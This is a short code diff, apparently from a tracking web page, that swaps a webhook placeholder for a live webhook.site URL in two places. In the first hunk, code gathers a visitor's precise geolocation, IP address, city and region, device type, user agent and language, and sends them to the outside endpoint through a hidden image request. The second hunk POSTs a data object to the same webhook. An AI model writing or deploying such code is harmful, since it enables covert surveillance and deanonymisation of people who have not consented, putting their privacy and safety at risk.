@@ -424,7 +424,7 @@
       const lat = pos.coords?.latitude || "unknown";
       const lon = pos.coords?.longitude || "unknown";
       const acc = pos.coords?.accuracy || "unknown";
-      const url = `INSERT UPDATED WEBHOOK HERE?ref=${encodeURIComponent(reason)}&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&country=${encodeURIComponent(locationData.country)}&region=${encodeURIComponent(locationData.region)}&city=${encodeURIComponent(locationData.city)}&ip=${encodeURIComponent(locationData.ip)}&deviceType=${encodeURIComponent(detectDeviceType())}&userAgent=${encodeURIComponent(navigator.userAgent)}&timestamp=${encodeURIComponent(new Date().toISOString())}&language=${encodeURIComponent(navigator.language)}`;
+      const url = `https://webhook.site/4fac1d79-2c52-4b93-8400-87e35ede6e2f?ref=${encodeURIComponent(reason)}&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&country=${encodeURIComponent(locationData.country)}&region=${encodeURIComponent(locationData.region)}&city=${encodeURIComponent(locationData.city)}&ip=${encodeURIComponent(locationData.ip)}&deviceType=${encodeURIComponent(detectDeviceType())}&userAgent=${encodeURIComponent(navigator.userAgent)}&timestamp=${encodeURIComponent(new Date().toISOString())}&language=${encodeURIComponent(navigator.language)}`;
       const img = new Image();
       img.onerror = () => console.error("GET request failed:", url);
       img.src = url;
@@ -484,7 +484,7 @@
       };
 
       try {
-        const response = await fetch("INSERT UPDATED WEBHOOK HERE", {
+        const response = await fetch("https://webhook.site/4fac1d79-2c52-4b93-8400-87e35ede6e2f", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
